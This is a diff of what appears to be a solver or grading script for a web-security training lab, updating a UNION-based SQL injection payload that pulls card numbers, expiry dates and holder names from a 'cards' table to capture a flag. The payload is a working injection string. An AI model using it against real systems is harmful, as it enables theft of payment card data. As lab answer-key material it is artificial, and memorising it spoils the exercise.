@@ -95,7 +95,7 @@ def week1():
     _, dash = get("/dashboard")
     check("W1-01 SQLi login bypass", bool(flag_in(dash)), flag_in(dash) or "no flag")
 
-    q = "' UNION SELECT card_number, card_holder, status FROM cards-- "
+    q = "' UNION SELECT card_number, expiry, card_holder, status FROM cards-- "
     _, body = get("/transactions" + qs(q=q))
     check("W1-02 UNION card leak", bool(flag_in(body)), flag_in(body) or "no flag")
 
